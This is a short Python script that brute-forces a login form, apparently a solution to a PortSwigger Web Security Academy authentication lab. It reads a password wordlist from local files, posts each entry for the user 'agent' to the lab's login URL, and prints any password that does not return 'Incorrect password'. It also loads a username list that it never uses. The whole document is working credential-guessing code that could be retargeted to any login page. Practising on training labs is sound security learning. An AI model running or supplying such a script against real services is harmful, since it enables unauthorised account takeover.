import requests

url = "https://0aeb00c204dc2915c00b5c8b00490062.web-security-academy.net/login"

fd1 = open("/home/tester13/Documents/CTF/Portswigger/Authentication/user.txt","r")
user_list=fd1.read()
fd1.close()

fd2 = open("/home/tester13/Documents/CTF/Portswigger/Authentication/pass.txt","r")
pass_list=fd2.read()
fd2.close()


user=list(user_list.split('\n'))
passwd=list(pass_list.split('\n'))



for i in passwd:
    data={
        "username":"agent",
        "password":i
    }
    r = requests.post(url,data=data)
    if "Incorrect password" not in r.text:
        print("password is {}".format(i))

